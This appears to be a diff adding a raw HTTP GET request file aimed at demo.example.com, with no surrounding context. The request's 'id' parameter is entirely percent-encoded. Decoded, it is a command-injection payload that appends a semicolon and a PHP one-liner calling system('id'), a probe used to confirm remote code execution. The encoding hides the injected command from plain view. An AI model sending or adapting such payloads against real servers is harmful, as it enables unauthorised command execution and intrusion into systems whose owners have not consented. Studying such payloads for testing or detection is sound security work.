@@ -1,0 +1,4 @@
+GET /a?id=%3B%20%70%68%70%20%2D%72%20%22%73%79%73%74%65%6D%28%27%69%64%27%29%3B%22 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
